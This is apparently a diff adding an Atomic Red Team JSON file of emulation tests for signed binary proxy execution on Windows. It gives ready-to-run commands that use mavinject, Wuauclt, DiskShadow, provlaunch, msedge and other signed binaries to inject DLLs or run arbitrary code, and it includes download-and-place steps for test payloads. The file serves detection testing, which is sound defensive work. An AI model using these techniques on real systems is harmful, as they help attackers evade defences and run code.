@@ -1,0 +1,431 @@
+{
+  "attack_technique": "T1218",
+  "display_name": "Signed Binary Proxy Execution",
+  "atomic_tests": [
+    {
+      "name": "mavinject - Inject DLL into running process",
+      "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\""
+      },
+      "input_arguments": {
+        "process_id": {
+          "description": "PID of process receiving injection",
+          "type": "string",
+          "default": "1000"
+        },
+        "dll_payload": {
+          "description": "DLL to inject",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "T1218.dll must exist on disk at specified location (#{dll_payload})",
+          "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "c426dacf-575d-4937-8611-a148a86a5e61"
+    },
+    {
+      "name": "Register-CimProvider - Execute evil dll",
+      "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\""
+      },
+      "input_arguments": {
+        "dll_payload": {
+          "description": "DLL to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})",
+          "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "ad2c17ed-f626-4061-b21e-b9804a6f3655"
+    },
+    {
+      "name": "InfDefaultInstall.exe .inf Execution",
+      "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "InfDefaultInstall.exe \"#{inf_to_execute}\""
+      },
+      "input_arguments": {
+        "inf_to_execute": {
+          "description": "Local location of inf file",
+          "type": "string",
+          "default": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "INF file must exist on disk at specified location (#{inf_to_execute})",
+          "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef"
+    },
+    {
+      "name": "ProtocolHandler.exe Downloaded a Suspicious File",
+      "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\""
+      },
+      "input_arguments": {
+        "remote_url": {
+          "description": "url to document",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Microsoft Word must be installed",
+          "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "db020456-125b-4c8b-a4a7-487df8afb5a2"
+    },
+    {
+      "name": "Microsoft.Workflow.Compiler.exe Payload Execution",
+      "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "#{mwcpath}\\#{mwcname} \"#{xml_payload}\" output.txt"
+      },
+      "input_arguments": {
+        "xml_payload": {
+          "description": "XML to execution",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
+        },
+        "mwcpath": {
+          "description": "Default location of Microsoft.Workflow.Compiler.exe",
+          "type": "path",
+          "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
+        },
+        "mwcname": {
+          "description": "Default name of microsoft.workflow.compiler.exe",
+          "type": "path",
+          "default": "microsoft.workflow.compiler.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": ".Net must be installed for this test to work correctly.",
+          "prereq_command": "if (Test-Path #{mwcpath}\\#{mwcname} ) {exit 0} else {exit 1}",
+          "get_prereq_command": "write-host \".Net must be installed for this test to work correctly.\""
+        }
+      ],
+      "auto_generated_guid": "7cbb0f26-a4c1-4f77-b180-a009aa05637e"
+    },
+    {
+      "name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions",
+      "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt"
+      },
+      "input_arguments": {
+        "xml_payload": {
+          "description": "XML to execution",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
+        },
+        "renamed_binary": {
+          "description": "renamed Microsoft.Workflow.Compiler",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe"
+        },
+        "mwcpath": {
+          "description": "Default location of Microsoft.Workflow.Compiler.exe",
+          "type": "path",
+          "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
+        },
+        "mwcname": {
+          "description": "Default name of microsoft.workflow.compiler.exe",
+          "type": "path",
+          "default": "microsoft.workflow.compiler.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": ".Net must be installed for this test to work correctly.",
+          "prereq_command": "if (Test-Path \"#{renamed_binary}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nCopy-Item #{mwcpath}\\#{mwcname} \"#{renamed_binary}\" -Force"
+        }
+      ],
+      "auto_generated_guid": "4cc40fd7-87b8-4b16-b2d7-57534b86b911"
+    },
+    {
+      "name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test",
+      "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"
+      },
+      "input_arguments": {
+        "module_name": {
+          "description": "Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified.",
+          "type": "string",
+          "default": "foo"
+        },
+        "module_path": {
+          "description": "Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules.",
+          "type": "string",
+          "default": "$PWD"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.",
+          "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}",
+          "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force"
+        }
+      ],
+      "auto_generated_guid": "9ebe7901-7edf-45c0-b5c7-8366300919db"
+    },
+    {
+      "name": "DiskShadow Command Execution",
+      "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "#{dspath} -S #{txt_payload}"
+      },
+      "input_arguments": {
+        "txt_payload": {
+          "description": "txt to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218\\src\\T1218.txt"
+        },
+        "dspath": {
+          "description": "Default location of DiskShadow.exe",
+          "type": "path",
+          "default": "C:\\Windows\\System32\\diskshadow.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "txt file must exist on disk at specified location (#{txt_payload})",
+          "prereq_command": "if (Test-Path \"#{txt_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt\" -OutFile \"#{txt_payload}\""
+        },
+        {
+          "description": "DiskShadow.exe must exist on disk at specified location (#{dspath})",
+          "prereq_command": "if (Test-Path #{dspath}) {exit 0} else {exit 1}",
+          "get_prereq_command": "echo \"DiskShadow.exe not found on disk at expected location\""
+        }
+      ],
+      "auto_generated_guid": "0e1483ba-8f0c-425d-b8c6-42736e058eaa"
+    },
+    {
+      "name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
+      "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer",
+        "cleanup_command": "taskkill /f /im calculator.exe > nul 2>&1"
+      },
+      "input_arguments": {
+        "arbitrary_dll": {
+          "description": "Path of DLL to be loaded",
+          "type": "string",
+          "default": "PathToAtomicsFolder\\T1218\\bin\\calc.dll"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})",
+          "prereq_command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{arbitrary_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "49fbd548-49e9-4bb7-94a6-3769613912b8"
+    },
+    {
+      "name": "Lolbin Gpscript logon option",
+      "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "Gpscript /logon"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "5bcda9cd-8e85-48fa-861d-b5a85d91d48c"
+    },
+    {
+      "name": "Lolbin Gpscript startup option",
+      "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "Gpscript /startup"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "f8da74bb-21b8-4af9-8d84-f2c8e4a220e3"
+    },
+    {
+      "name": "Lolbas ie4uinit.exe use as proxy",
+      "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy \"#{Path_inf}\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings",
+        "cleanup_command": "del %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1"
+      },
+      "input_arguments": {
+        "Path_inf": {
+          "description": "Path to the cab file",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218\\src\\ieuinit.inf"
+        },
+        "Path_ie4uinit": {
+          "description": "Path to ie4uinit.exe",
+          "type": "path",
+          "default": "c:\\windows\\system32\\ie4uinit.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})",
+          "prereq_command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_inf}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf\" -OutFile \"#{Path_inf}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "13c0804e-615e-43ad-b223-2dfbacd0b0b3"
+    },
+    {
+      "name": "LOLBAS CustomShellHost to Spawn Process",
+      "description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "if (-not (Test-Path #{dest_path})) {\nNew-Item -Path #{dest_path} -ItemType Directory\n} else {\nWrite-Host \"Directory #{dest_path} already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"#{dest_path}\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"#{dest_path}\\explorer.exe\" -Force\n#{dest_path}\\customshellhost.exe",
+        "cleanup_command": "Remove-Item -Path #{dest_path} -Recurse -Force"
+      },
+      "input_arguments": {
+        "dest_path": {
+          "description": "Directory to copy files into",
+          "type": "path",
+          "default": "C:\\test"
+        }
+      },
+      "auto_generated_guid": "b1eeb683-90bb-4365-bbc2-2689015782fe"
+    },
+    {
+      "name": "Provlaunch.exe Executes Arbitrary Command via Registry Key",
+      "description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "ab76e34f-28bf-441f-a39c-8db4835b89cc"
+    },
+    {
+      "name": "LOLBAS Msedge to Spawn Process",
+      "description": "Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn \"calc.exe\" as a child process of msedge.exe\n- https://lolbas-project.github.io/lolbas/Binaries/Msedge/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "$edgePath64 = \"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"\nif (Test-Path $edgePath64) {\n    $edgePath = $edgePath64\n} else {\n    # Check 32-bit Edge installation path\n    $edgePath32 = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\n    if (Test-Path $edgePath32) {\n        $edgePath = $edgePath32\n    } else {\n        exit 1\n    }\n}\n& $edgePath --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\calc.exe &&\"\nsleep 5\ntaskkill -f -im msedge.exe\ntaskkill -f -im calc.exe\ntaskkill -f -im win32calc.exe"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "e5eedaed-ad42-4c1e-8783-19529738a349"
+    },
+    {
+      "name": "System Binary Proxy Execution - Wlrmdr Lolbin",
+      "description": "Use wlrmdr(Windows Logon Reminder executable) as a proxy binary to evade defensive countermeasures",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \"#{payload_path}\""
+      },
+      "input_arguments": {
+        "payload_path": {
+          "description": "Path to the executable",
+          "type": "String",
+          "default": "C:\\Windows\\System32\\calc.exe"
+        }
+      },
+      "auto_generated_guid": "7816c252-b728-4ea6-a683-bd9441ca0b71"
+    }
+  ]
+}
